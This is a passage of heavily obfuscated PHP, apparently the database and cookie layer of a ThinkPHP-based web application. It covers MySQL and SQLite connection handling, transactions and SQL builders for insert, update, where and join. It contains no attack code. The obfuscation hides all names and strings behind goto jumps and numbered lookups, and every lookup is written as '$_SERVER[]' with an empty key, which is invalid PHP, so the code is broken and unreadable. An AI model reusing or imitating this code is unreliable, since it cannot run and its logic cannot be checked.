!1, $FЬ); goto cέ; eϊ: if (isset(self::$sameCookieSet[$B]) && self::$sameCookieSet[$B] == $F . $ežὊ) { return; } self::$sameCookieSet[$B] = $F . $ežὊ; if (!$b㸘) { $b㸘 = str_replace(HOST, $E[33], APP_HOST); $b㸘 = _get($GLOBALS, $E[846], $b㸘); } goto b; Fʕ: $E =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$ežὊ) { $ežὊ = 24 * 3600 * 7; } goto eϊ; cέ: } public static function setSafe($Aգ, $aԬߒ, $CΨ = 0) { self::set($Aգ, $aԬߒ, $CΨ, !0); } public static function get($B女ޠ) { return isset($_COOKIE[$B女ޠ]) ? $_COOKIE[$B女ޠ] : !1; } public static function remove($B, $D펨ղ = false) { unset($_COOKIE[$B]); self::set($B, $_SERVER[][33], 1, $D펨ղ); } } class DbMysql extends Db { public function __construct($a׻ = '') { $d홾ɿ =& $_SERVER[]; if (!extension_loaded($d홾ɿ[764])) { think_exception(think_lang($d홾ɿ[10]) . $d홾ɿ[847]); } if (!empty($a׻)) { $this->config = $a׻; if (empty($this->config[$d홾ɿ[13]])) { $this->config[$d홾ɿ[13]] = $d홾ɿ[33]; } } } public function connect($E̺ = '', $Eƍ = 0, $a = false) { $F =& $_SERVER[]; if (!isset($this->linkID[$Eƍ])) { goto AǐԆ; f醮: if ($d޽̽) { $this->linkID[$Eƍ] = mysql_pconnect($c, $E̺[$F[850]], $E̺[$F[851]], 131072); } else { $this->linkID[$Eƍ] = mysql_connect($c, $E̺[$F[850]], $E̺[$F[851]], !0, 131072); } if (!$this->linkID[$Eƍ] || !empty($E̺[$F[17]]) && !mysql_select_db($E̺[$F[17]], $this->linkID[$Eƍ])) { think_exception(mysql_error()); } $E׷ = mysql_get_server_info($this->linkID[$Eƍ]); goto aŇ; f탊: if (1 != think_config($F[18])) { unset($this->config); } goto Aώ; AǐԆ: if (empty($E̺)) { $E̺ = $this->config; } $c = $E̺[$F[848]] . ($E̺[$F[849]] ? "\x3a{$E̺[$F[849]]}" : $F[33]); $d޽̽ = !empty($E̺[$F[13]][$F[14]]) ? $E̺[$F[13]][$F[14]] : $this->pconnect; goto f醮; aŇ: mysql_query($F[852] . think_config($F[853]) . $F[55], $this->linkID[$Eƍ]); if ($E׷ > $F[854]) { mysql_query($F[855], $this->linkID[$Eƍ]); } $this->connected = !0; goto f탊; Aώ: } return $this->linkID[$Eƍ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E) { goto BƵׅ; Eߘ: if (!$this->_linkID) { return !1; } $this->queryStr = $E; if ($this->queryID) { $this->free(); } goto d򥥋; BƵׅ: $fܵ =& $_SERVER[]; if (0 === stripos($E, $fܵ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Eߘ; eȊ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto C̨; d򥥋: think_action_status($fܵ[19], 1); think_status($fܵ[20]); $this->queryID = mysql_query($E, $this->_linkID); goto eȊ; C̨: } public function execute($fٲ) { goto D陵̰; D陵̰: $a =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c֔ыĂ; A٫: if (!1 === $eև) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto eފ; Fҟ: think_status($a[20]); $eև = mysql_query($fٲ, $this->_linkID); $this->debug(); goto A٫; c֔ыĂ: $this->queryStr = $fٲ; if ($this->queryID) { $this->free(); } think_action_status($a[21], 1); goto Fҟ; eފ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][856], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b = mysql_query($_SERVER[][857], $this->_linkID); $this->transTimes = 0; if (!$b) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F訷 = mysql_query($_SERVER[][858], $this->_linkID); $this->transTimes = 0; if (!$F訷) { $this->error(); return !1; } } return !0; } private function getAll() { $f = array(); if ($this->numRows > 0) { while ($AÔѝյ = mysql_fetch_assoc($this->queryID)) { $f[] = $AÔѝյ; } mysql_data_seek($this->queryID, 0); } return $f; } public function getFields($E) { $E˂ =& $_SERVER[]; $dƏ = $this->query($E˂[859] . $this->parseKey($E)); $cێ = array(); if ($dƏ) { foreach ($dƏ as $f蚐 => $d) { $cێ[$d[$E˂[27]]] = array($E˂[28] => $d[$E˂[27]], $E˂[29] => $d[$E˂[30]], $E˂[31] => (bool) (strtoupper($d[$E˂[32]]) === $E˂[860]), $E˂[34] => $d[$E˂[35]], $E˂[36] => strtolower($d[$E˂[37]]) == $E˂[38], $E˂[39] => strtolower($d[$E˂[40]]) == $E˂[41]); } } return $cێ; } public function getTables($B = '') { $dԩ =& $_SERVER[]; if (!empty($B)) { $c砛ą = $dԩ[861] . $B . $dԩ[862]; } else { $c砛ą = $dԩ[863]; } $Eɱ = $this->query($c砛ą); $Aϛ = array(); foreach ($Eɱ as $eߑЬ => $C˯) { $Aϛ[$eߑЬ] = current($C˯); } return $Aϛ; } public function replace($Cҟ, $B܂ʨ = array()) { $FޮӮ =& $_SERVER[]; foreach ($Cҟ as $E岜 => $cﮉ) { $E = $this->parseValue($cﮉ); if (is_scalar($E)) { $B[] = $E; $bɽ[] = $this->parseKey($E岜); } } $cī = $FޮӮ[864] . $this->parseTable($B܂ʨ[$FޮӮ[277]]) . $FޮӮ[865] . implode($FޮӮ[47], $bɽ) . $FޮӮ[866] . implode($FޮӮ[47], $B) . $FޮӮ[867]; return $this->execute($cī); } public function insertAll($Fȳ, $a = array(), $dթũ = false) { goto eꆹǂ; A욆: $Aϼ = ($dթũ ? $d[869] : $d[870]) . $d[871] . $this->parseTable($a[$d[277]]) . $d[865] . implode($d[47], $AƂ) . $d[872] . implode($d[47], $Eߒ); return $this->execute($Aϼ); goto AԽȤ; eꆹǂ: $d =& $_SERVER[]; if (!is_array($Fȳ[0])) { return !1; } $AƂ = array_keys($Fȳ[0]); goto aݲ; aݲ: $Eߒ = array(); foreach ($Fȳ as $a) { $bнפ = array(); foreach ($a as $e￟ => $BЈ) { $BЈ = $this->parseValue($BЈ); if (is_scalar($BЈ)) { $bнפ[] = $BЈ; } } $Eߒ[] = $d[258] . implode($d[47], $bнפ) . $d[867]; } array_walk($AƂ, array($this, $d[868])); goto A욆; AԽȤ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aِ݃ =& $_SERVER[]; $this->error = mysql_errno() . $Aِ݃[4] . mysql_error($this->_linkID); if ($Aِ݃[33] != $this->queryStr) { $this->error .= LNG($Aِ݃[45]) . $this->queryStr; } think_trace($this->error, $Aِ݃[33], $Aِ݃[46]); return $this->error; } public function escapeString($DȌŭ) { if ($this->_linkID) { return mysql_real_escape_string($DȌŭ, $this->_linkID); } else { return mysql_escape_string($DȌŭ); } } public function parseKey(&$bĵ, $bԅ = true) { $b =& $_SERVER[]; if ($bԅ) { $bĵ = $this->parseKeyCheck($bĵ); } if ($bĵ != $b[182] && !preg_match($b[873], $bĵ)) { $bĵ = $b[382] . trim($bĵ, $b[382]) . $b[382]; } return $bĵ; } } goto E; EȊ: class DbSqlite3 extends DbSqlite3Base { public function query($aգ) { $a҄ݩ =& $_SERVER[]; if (!CacheLock::fileLock($a҄ݩ[9])) { return !1; } $fԏ = parent::query($aգ); CacheLock::fileUnLock($a҄ݩ[9]); return $fԏ; } public function execute($AЇ) { $C =& $_SERVER[]; if (!CacheLock::fileLock($C[9])) { return !1; } $a = parent::execute($AЇ); CacheLock::fileUnLock($C[9]); return $a; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\161" => "\x3c\76", "\147\x74" => "\x3e", "\145\147\x74" => "\76\x3d", "\x6c\164" => "\74", "\145\x6c\x74" => "\74\x3d", "\x6e\157\x74\154\151\x6b\145" => "\116\x4f\x54\x20\x4c\111\x4b\105", "\154\x69\153\x65" => "\x4c\x49\x4b\x45", "\x69\156" => "\111\116", "\x6e\157\164\151\x6e" => "\116\x4f\x54\x20\x49\116", "\156\x6f\x74\x20\151\156" => "\116\x4f\x54\x20\x49\x4e", "\142\145\164\167\x65\145\156" => "\102\x45\124\x57\105\x45\x4e", "\x6e\157\164\x62\145\x74\x77\145\x65\156" => "\116\x4f\x54\40\x42\105\x54\127\105\x45\116", "\156\157\164\40\x62\x65\164\x77\x65\145\156" => "\116\117\124\40\x42\105\x54\x57\105\105\x4e"); protected $selectSql = "\123\x45\114\105\x43\124\45\104\111\123\124\111\x4e\x43\x54\x25\x20\x25\x46\111\x45\114\x44\x25\x20\x46\x52\x4f\x4d\x20\x25\x54\101\102\x4c\x45\45\x25\x4a\x4f\x49\116\45\45\127\x48\x45\122\x45\45\45\107\x52\117\x55\x50\45\45\x48\x41\126\111\116\x47\45\45\x4f\x52\104\x45\122\x25\45\x4c\x49\115\111\x54\x25\40\x25\125\x4e\111\x4f\116\45\x25\x43\x4f\115\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $eں = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][921], $eں); } public function factory($E = '') { goto f; a׿: return $Eի; goto Bќޠ; f: $Bޤ =& $_SERVER[]; $E = $this->parseConfig($E); if (empty($E[$Bޤ[922]])) { think_exception(think_lang($Bޤ[923])); } goto Bڐ; Bڐ: $this->dbType = ucwords(strtolower($E[$Bޤ[922]])); $f = $Bޤ[924] . $this->dbType; if (class_exists($f)) { $Eի = new $f($E); if ($Bޤ[760] != strtolower($E[$Bޤ[922]])) { $Eի->dbType = strtoupper($this->dbType); } else { $Eի->dbType = $this->_getDsnType($E[$Bޤ[877]]); } } else { think_exception(think_lang($Bޤ[925]) . $Bޤ[926] . $f); } goto a׿; Bќޠ: } public function __call($Aذﴖ, $C絊) { if (method_exists($this, $Aذﴖ)) { return call_user_func_array(array($this, $Aذﴖ), $C絊); } } protected function _getDsnType($dثӅ櫝) { $fЈ٨ = explode($_SERVER[][4], $dثӅ櫝); $F՛ނ = strtoupper(trim($fЈ٨[0])); return $F՛ނ; } private function parseConfig($f = '') { $E׉ =& $_SERVER[]; if (!empty($f) && is_string($f)) { $f = $this->parseDSN($f); } elseif (is_array($f)) { $f = array_change_key_case($f); $f = array($E׉[922] => $f[$E׉[759]], $E׉[850] => $f[$E׉[927]], $E׉[851] => $f[$E׉[928]], $E׉[848] => $f[$E׉[929]], $E׉[849] => $f[$E׉[930]], $E׉[17] => $f[$E׉[931]], $E׉[877] => $f[$E׉[761]], $E׉[13] => isset($f[$E׉[932]]) ? $f[$E׉[932]] : array()); } elseif (empty($f)) { if (think_config($E׉[933]) && $E׉[760] != strtolower(think_config($E׉[934]))) { $f = $this->parseDSN(think_config($E׉[933])); } else { $f = array($E׉[922] => think_config($E׉[934]), $E׉[850] => think_config($E׉[935]), $E׉[851] => think_config($E׉[936]), $E׉[848] => think_config($E׉[937]), $E׉[849] => think_config($E׉[938]), $E׉[17] => think_config($E׉[244]), $E׉[877] => think_config($E׉[933]), $E׉[13] => think_config($E׉[939])); } } return $f; } protected function initConnect($E⨩ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($E⨩); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $A => $BŚƑ޻) { $this->_linkID = $BŚƑ޻; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($aدœ = false) { goto D钆ؤ; Cъ: $f = array($A[850] => isset($Dǉ[$A[850]][$dȣҤ]) ? $Dǉ[$A[850]][$dȣҤ] : $Dǉ[$A[850]][0], $A[851] => isset($Dǉ[$A[851]][$dȣҤ]) ? $Dǉ[$A[851]][$dȣҤ] : $Dǉ[$A[851]][0], $A[848] => isset($Dǉ[$A[848]][$dȣҤ]) ? $Dǉ[$A[848]][$dȣҤ] : $Dǉ[$A[848]][0], $A[849] => isset($Dǉ[$A[849]][$dȣҤ]) ? $Dǉ[$A[849]][$dȣҤ] : $Dǉ[$A[849]][0], $A[17] => isset($Dǉ[$A[17]][$dȣҤ]) ? $Dǉ[$A[17]][$dȣҤ] : $Dǉ[$A[17]][0], $A[877] => isset($Dǉ[$A[877]][$dȣҤ]) ? $Dǉ[$A[877]][$dȣҤ] : $Dǉ[$A[877]][0], $A[13] => isset($Dǉ[$A[13]][$dȣҤ]) ? $Dǉ[$A[13]][$dȣҤ] : $Dǉ[$A[13]][0]); return $this->connect($f, $dȣҤ); goto C㫒; f劦ޱ: if (empty($Dǉ)) { foreach ($this->config as $b => $C) { $Dǉ[$b] = explode($A[47], $C); } } if (think_config($A[940])) { if ($aدœ) { $dȣҤ = floor(mt_rand(0, think_config($A[941]) - 1)); $A辆Ԃ = $dȣҤ; } else { if (is_numeric(think_config($A[942]))) { $dȣҤ = think_config($A[942]); } else { $dȣҤ = floor(mt_rand(think_config($A[941]), count($Dǉ[$A[848]]) - 1)); } } } else { $dȣҤ = floor(mt_rand(0, count($Dǉ[$A[848]]) - 1)); $A辆Ԃ = $dȣҤ; } $dȣҤ = $A辆Ԃ !== -1 ? $A辆Ԃ : $dȣҤ; goto Cъ; D钆ؤ: $A =& $_SERVER[]; static $Dǉ = array(); static $A辆Ԃ = -1; goto f劦ޱ; C㫒: } public function parseDSN($dܩ) { $Cԕ =& $_SERVER[]; if (empty($dܩ)) { return !1; } $f߉ = parse_url($dܩ); if ($f߉[$Cԕ[174]]) { $eՍը = array($Cԕ[922] => $f߉[$Cԕ[174]], $Cԕ[850] => isset($f߉[$Cԕ[575]]) ? $f߉[$Cԕ[575]] : $Cԕ[33], $Cԕ[851] => isset($f߉[$Cԕ[943]]) ? $f߉[$Cԕ[943]] : $Cԕ[33], $Cԕ[848] => isset($f߉[$Cԕ[175]]) ? $f߉[$Cԕ[175]] : $Cԕ[33], $Cԕ[849] => isset($f߉[$Cԕ[176]]) ? $f߉[$Cԕ[176]] : $Cԕ[33], $Cԕ[17] => isset($f߉[$Cԕ[76]]) ? substr($f߉[$Cԕ[76]], 1) : $Cԕ[33]); } else { preg_match($Cԕ[944], trim($dܩ), $c̩); $eՍը = array($Cԕ[922] => $c̩[1], $Cԕ[850] => $c̩[2], $Cԕ[851] => $c̩[3], $Cԕ[848] => $c̩[4], $Cԕ[849] => $c̩[5], $Cԕ[17] => $c̩[6]); } $eՍը[$Cԕ[877]] = $Cԕ[33]; return $eՍը; } protected function debug() { $B =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $B[945]; if (think_config($B[946])) { think_status($B[947]); think_trace($this->queryStr . $B[948] . think_status($B[20], $B[947], 6) . $B[949], $B[33], $B[950]); } } protected function parseLock($dɞ = false) { $a =& $_SERVER[]; if (!$dɞ) { return $a[33]; } if ($a[879] == $this->dbType) { return $a[951]; } return $a[952]; } protected function parseSet($E㌸) { $Eܠ =& $_SERVER[]; foreach ($E㌸ as $B崮 => $Bފ) { if (is_array($Bފ) && $Eܠ[295] == $Bފ[0]) { $b嬭ڙ[] = $this->parseKey($B崮) . $Eܠ[953] . $Bފ[1]; } elseif (is_scalar($Bފ) || is_null($Bފ)) { $b嬭ڙ[] = $this->parseKey($B崮) . $Eܠ[953] . $this->parseValue($Bފ); } } return $Eܠ[954] . implode($Eܠ[47], $b嬭ڙ); } protected function bindParam($e琂Ƅ, $Bù) { $this->bind[$_SERVER[][4] . $e琂Ƅ] = $Bù; } protected function parseBind($f) { $f = array_merge($this->bind, $f); $this->bind = array(); return $f; } function parseKey(&$dÉ, $b锑 = true) { if ($b锑) { $dÉ = $this->parseKeyCheck($dÉ); } return $dÉ; } function parseKeyCheck($C˛ߨ) { $fϠ璏 =& $_SERVER[]; $C˛ߨ = trim($C˛ߨ); if (!preg_match($fϠ璏[955], $C˛ߨ)) { think_exception($fϠ璏[956] . $C˛ߨ); } return $C˛ߨ; } protected function parseValue($Bᖅå) { $b =& $_SERVER[]; if (is_string($Bᖅå)) { $Bᖅå = $b[918] . $this->escapeString($Bᖅå) . $b[918]; } elseif (isset($Bᖅå[0]) && is_string($Bᖅå[0]) && strtolower($Bᖅå[0]) == $b[295]) { $Bᖅå = $this->escapeString($Bᖅå[1]); } elseif (is_array($Bᖅå)) { $Bᖅå = array_map(array($this, $b[919]), $Bᖅå); } elseif (is_bool($Bᖅå)) { $Bᖅå = $Bᖅå ? $b[87] : $b[191]; } elseif (is_null($Bᖅå)) { $Bᖅå = $b[103]; } return $Bᖅå; } protected function parseField($b) { $f =& $_SERVER[]; if (is_string($b) && strpos($b, $f[47])) { $b = explode($f[47], $b); } if (is_array($b)) { $fޕ = array(); foreach ($b as $Eň޶ => $B۞) { if (!is_numeric($Eň޶)) { $fޕ[] = $this->parseKey($Eň޶, !1) . $f[957] . $this->parseKey($B۞); } else { $fޕ[] = $this->parseKey($B۞); } } $D = implode($f[47], $fޕ); } elseif (is_string($b) && !empty($b)) { $D = $b; } else { $D = $f[182]; } return $D; } protected function parseTable($d޳) { $C =& $_SERVER[]; if (is_array($d޳)) { $e = array(); foreach ($d޳ as $bΈ => $F׌) { if (!is_numeric($bΈ)) { $e[] = $this->parseKey($bΈ) . $C[50] . $this->parseKey($F׌); } else { $e[] = $this->parseKey($bΈ); } } $d޳ = $e; } elseif (is_string($d޳)) { if (strstr($d޳, $C[50])) { return $d޳; } $d޳ = explode($C[47], $d޳); array_walk($d޳, array($this, $C[868])); } return $C[862] . trim(implode($C[958], $d޳), $C[382]) . $C[862]; } protected function parseWhere($Eٕ) { $f㸼 =& $_SERVER[]; $E腦 = $f㸼[33]; if (is_string($Eٕ)) { $E腦 = $Eٕ; } else { $d = isset($Eٕ[$f㸼[959]]) ? strtoupper($Eٕ[$f㸼[959]]) : $f㸼[33]; if (in_array($d, array($f㸼[960], $f㸼[961], $f㸼[962]))) { $d = $f㸼[50] . $d . $f㸼[50]; unset($Eٕ[$f㸼[959]]); } else { $d = $f㸼[963]; } foreach ($Eٕ as $b׻ => $BŖ) { $E腦 .= $f㸼[275]; if (is_numeric($b׻)) { $b׻ = $f㸼[964]; } if (0 === strpos($b׻, $f㸼[71])) { $E腦 .= $this->parseThinkWhere($b׻, $BŖ); } else { if (!preg_match($f㸼[965], trim($b׻))) { think_exception(think_lang($f㸼[966]) . $f㸼[4] . $b׻); } $cɕ = is_array($BŖ) && isset($BŖ[$f㸼[967]]); $b׻ = trim($b׻); if (strpos($b׻, $f㸼[281])) { $Cǟ = explode($f㸼[281], $b׻); $f = array(); foreach ($Cǟ as $Fλ => $F½) { $e = $cɕ ? $BŖ[$Fλ] : $BŖ; $f[] = $f㸼[258] . $this->parseWhereItem($this->parseKey($F½), $e) . $f㸼[867]; } $E腦 .= implode($f㸼[968], $f); } elseif (strpos($b׻, $f㸼[282])) { $Cǟ = explode($f㸼[282], $b׻); $f = array(); foreach ($Cǟ as $Fλ => $F½) { $e = $cɕ ? $BŖ[$Fλ] : $BŖ; $f[] = $f㸼[258] . $this->parseWhereItem($this->parseKey($F½), $e) . $f㸼[867]; } $E腦 .= implode($f㸼[963], $f); } else { $E腦 .= $this->parseWhereItem($this->parseKey($b׻), $BŖ); } } $E腦 .= $f㸼[276] . $d; } $E腦 = substr($E腦, 0, -strlen($d)); } return empty($E腦) ? $f㸼[33] : $f㸼[969] . $E腦; } protected function parseWhereItem($f淭, $cÅ) { $Aضϼ =& $_SERVER[]; $D = $Aضϼ[33]; if (is_array($cÅ)) { if (is_string($cÅ[0])) { $aۓ䛢 = strtolower($cÅ[0]); if (in_array($cÅ[0], array($Aضϼ[953], $Aضϼ[970], $Aضϼ[971], $Aضϼ[972], $Aضϼ[973], $Aضϼ[974]))) { $D .= $f淭 . $Aضϼ[50] . $cÅ[0] . $Aضϼ[50] . $this->parseValue($cÅ[1]); } elseif (preg_match($Aضϼ[975], $cÅ[0])) { $D .= $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[50] . $this->parseValue($cÅ[1]); } elseif (preg_match($Aضϼ[976], $cÅ[0])) { if (is_array($cÅ[1])) { $Aě = isset($cÅ[2]) ? strtoupper($cÅ[2]) : $Aضϼ[961]; if (in_array($Aě, array($Aضϼ[960], $Aضϼ[961], $Aضϼ[962]))) { $aꍃ = array(); foreach ($cÅ[1] as $d) { $aꍃ[] = $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[50] . $this->parseValue($d); } $D .= $Aضϼ[258] . implode($Aضϼ[50] . $Aě . $Aضϼ[50], $aꍃ) . $Aضϼ[867]; } } else { $D .= $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[50] . $this->parseValue($cÅ[1]); } } elseif ($Aضϼ[295] == $aۓ䛢) { $D .= $Aضϼ[865] . $f淭 . $Aضϼ[50] . $cÅ[1] . $Aضϼ[977]; } elseif (preg_match($Aضϼ[978], $cÅ[0])) { $D .= $cÅ[0]; } elseif (preg_match($Aضϼ[979], $cÅ[0])) { if (isset($cÅ[2]) && $Aضϼ[295] == $cÅ[2]) { $D .= $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[50] . $cÅ[1]; } else { if (is_string($cÅ[1])) { $cÅ[1] = explode($Aضϼ[47], $cÅ[1]); } $aڿϷ = implode($Aضϼ[47], $this->parseValue($cÅ[1])); $D .= $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[865] . $aڿϷ . $Aضϼ[867]; } } elseif (preg_match($Aضϼ[980], $cÅ[0])) { $a㚑Ի = is_string($cÅ[1]) ? explode($Aضϼ[47], $cÅ[1]) : $cÅ[1]; $D .= $Aضϼ[865] . $f淭 . $Aضϼ[50] . $this->exp[$aۓ䛢] . $Aضϼ[50] . $this->parseValue($a㚑Ի[0]) . $Aضϼ[963] . $this->parseValue($a㚑Ի[1]) . $Aضϼ[276]; } else { think_exception(think_lang($Aضϼ[966]) . $Aضϼ[4] . $cÅ[0]); } } else { $D = count($cÅ); $B펌 = $Aضϼ[33]; if (is_string($cÅ[$D - 1])) { $B펌 = isset($cÅ[$D - 1]) ? strtoupper($cÅ[$D - 1]) : $Aضϼ[33]; if (in_array($B펌, array($Aضϼ[960], $Aضϼ[961], $Aضϼ[962]))) { $D = $D - 1; } } else { $B펌 = $Aضϼ[960]; } for ($Ḙ = 0; $Ḙ < $D; $Ḙ++) { $a㚑Ի = is_array($cÅ[$Ḙ]) ? $cÅ[$Ḙ][1] : $cÅ[$Ḙ]; if ($Aضϼ[295] == strtolower($cÅ[$Ḙ][0])) { $D .= $Aضϼ[258] . $f淭 . $Aضϼ[50] . $a㚑Ի . $Aضϼ[977] . $B펌 . $Aضϼ[50]; } else { $aҼ = is_array($cÅ[$Ḙ]) ? $this->exp[strtolower($cÅ[$Ḙ][0])] : $Aضϼ[953]; if (!$aҼ && is_array($cÅ[$Ḙ]) && in_array($cÅ[$Ḙ][0], array($Aضϼ[953], $Aضϼ[970], $Aضϼ[971], $Aضϼ[972], $Aضϼ[973], $Aضϼ[974]))) { $aҼ = $cÅ[$Ḙ][0]; } $D .= $Aضϼ[258] . $f淭 . $Aضϼ[50] . $aҼ . $Aضϼ[50] . $this->parseValue($a㚑Ի) . $Aضϼ[977] . $B펌 . $Aضϼ[50]; } } $D = substr($D, 0, -4); } } else { $D .= $f淭 . $Aضϼ[981] . $this->parseValue($cÅ); } return $D; } protected function parseThinkWhere($a, $e؛ȝ) { $f =& $_SERVER[]; $B = $f[33]; switch ($a) { case $f[350]: $B = $e؛ȝ; break; case $f[964]: $B = is_string($e؛ȝ) ? $e؛ȝ : substr($this->parseWhere($e؛ȝ), 6); break; case $f[982]: parse_str($e؛ȝ, $B); if (isset($B[$f[959]])) { $eؚ = $f[50] . strtoupper($B[$f[959]]) . $f[50]; unset($B[$f[959]]); } else { $eؚ = $f[963]; } $Bވ = array(); foreach ($B as $EǇ޽ => $A߅) { $Bވ[] = $this->parseKey($EǇ޽) . $f[981] . $this->parseValue($A߅); } $B = implode($eؚ, $Bވ); break; } return $B; } protected function parseLimit($b̹) { $Fŉ =& $_SERVER[]; return !empty($b̹) ? $Fŉ[48] . $b̹ . $Fŉ[50] : $Fŉ[33]; } protected function parseJoin($e) { $d =& $_SERVER[]; $cȦ = $d[33]; if (!empty($e)) { if (is_array($e)) { foreach ($e as $C؎ => $b͙) { if (!1 !== stripos($b͙, $d[983])) { $cȦ .= $d[50] . $b͙; } else { $cȦ .= $d[984] . $b͙; } } } else { $cȦ .= $d[984] . $e; } } $cȦ = preg_replace($d[985], think_config($d[891]) . $d[986], $cȦ); return $cȦ; } protected function parseOrder($bï) { $eސ =& $_SERVER[]; if (is_array($bï)) { $B = array(); foreach ($bï as $e => $D뭧) { if (is_numeric($e)) { $B[] = $this->parseKey($D뭧); } else { $D뭧 = in_array(strtoupper(trim($D뭧)), array($eސ[987], $eސ[988])) ? $eސ[50] . $D뭧 : $eސ[33]; if (preg_match($eސ[989], $e)) { $B[] = $this->parseKey($e) . $D뭧; } else { think_exception($eސ[990] . $e); } } } $bï = implode($eސ[47], $B); } return !empty($bï) ? $eސ[991] . $bï : $eސ[33]; } protected function parseGroup($Eջ) { $C =& $_SERVER[]; return !empty($Eջ) ? $C[992] . $Eջ : $C[33]; } protected function parseHaving($b϶ϟԳ) { $Aᢃ =& $_SERVER[]; return !empty($b϶ϟԳ) ? $Aᢃ[993] . $b϶ϟԳ : $Aᢃ[33]; } protected function parseComment($Eۣؓ) { $d܊ =& $_SERVER[]; return !empty($Eۣؓ) ? $d܊[994] . $Eۣؓ . $d܊[995] : $d܊[33]; } protected function parseDistinct($B䂷ۨ) { $fߑ =& $_SERVER[]; return !empty($B䂷ۨ) ? $fߑ[996] : $fߑ[33]; } protected function parseUnion($F܏) { $B߈߱ =& $_SERVER[]; if (empty($F܏)) { return $B߈߱[33]; } if (isset($F܏[$B߈߱[346]])) { $B = $B߈߱[997]; unset($F܏[$B߈߱[346]]); } else { $B = $B߈߱[998]; } foreach ($F܏ as $Dי) { $c[] = $B . (is_array($Dי) ? $this->buildSelectSql($Dי) : $Dי); } return implode($B߈߱[50], $c); } public function insert($cĿ, $Eӝࢂ = array(), $bٻΤ = false) { goto fȑي; C: foreach ($cĿ as $fֱ => $A) { if (is_array($A) && $Eҥ[295] == $A[0]) { $F͂曳[] = $this->parseKey($fֱ); $a֫[] = $A[1]; } elseif (is_scalar($A) || is_null($A)) { $F͂曳[] = $this->parseKey($fֱ); $a֫[] = $this->parseValue($A); } } $Eֳ = ($bٻΤ ? $Eҥ[869] : $Eҥ[870]) . $Eҥ[871] . $this->parseTable($Eӝࢂ[$Eҥ[277]]) . $Eҥ[865] . implode($Eҥ[47], $F͂曳) . $Eҥ[866] . implode($Eҥ[47], $a֫) . $Eҥ[867]; $Eֳ .= $this->parseLock(isset($Eӝࢂ[$Eҥ[817]]) ? $Eӝࢂ[$Eҥ[817]] : !1); goto bʫ; fȑي: $Eҥ =& $_SERVER[]; $a֫ = $F͂曳 = array(); $this->model = $Eӝࢂ[$Eҥ[279]]; goto C; bʫ: $Eֳ .= $this->parseComment(!empty($Eӝࢂ[$Eҥ[352]]) ? $Eӝࢂ[$Eҥ[352]] : $Eҥ[33]); return $this->execute($Eֳ, $this->parseBind(!empty($Eӝࢂ[$Eҥ[283]]) ? $Eӝࢂ[$Eҥ[283]] : array())); goto cɢ; cɢ: } public function selectInsert($c뒑, $Cݙ, $bГ = array()) { goto e; e: $a =& $_SERVER[]; $this->model = $bГ[$a[279]]; if (is_string($c뒑)) { $c뒑 = explode($a[47], $c뒑); } goto fԱ; fɂ: return $this->execute($CŪ, $this->parseBind(!empty($bГ[$a[283]]) ? $bГ[$a[283]] : array())); goto b; fԱ: array_walk($c뒑, array($this, $a[868])); $CŪ = $a[999] . $this->parseTable($Cݙ) . $a[865] . implode($a[47], $c뒑) . $a[977]; $CŪ .= $this->buildSelectSql($bГ); goto fɂ; b: } public function update($cˑߨ, $dؘ) { $Aㆊ =& $_SERVER[]; $this->model = $dؘ[$Aㆊ[279]]; $Dߒ = $Aㆊ[1000] . $this->parseTable($dؘ[$Aㆊ[277]]) . $this->parseSet($cˑߨ) . $this->parseWhere(!empty($dؘ[$Aㆊ[273]]) ? $dؘ[$Aㆊ[273]] : $Aㆊ[33]) . $this->parseOrder(!empty($dؘ[$Aㆊ[363]]) ? $dؘ[$Aㆊ[363]] : $Aㆊ[33]) . $this->parseLimit(!empty($dؘ[$Aㆊ[290]]) ? $dؘ[$Aㆊ[290]] : $Aㆊ[33]) . $this->parseLock(isset($dؘ[$Aㆊ[817]]) ? $dؘ[$Aㆊ[817]] : !1) . $this->parseComment(!empty($dؘ[$Aㆊ[352]]) ? $dؘ[$Aㆊ[352]] : $Aㆊ[33]); return $this->execute($Dߒ, $this->parseBind(!empty($dؘ[$Aㆊ[283]]) ? $dؘ[$Aㆊ[283]] : array())); } public function delete($fҝ = array()) { $D =& $_SERVER[]; $this->model = $fҝ[$D[279]]; $cǰ = $D[1001] . $this->parseTable($fҝ[$D[277]]) . $this->parseWhere(!empty($fҝ[$D[273]]) ? 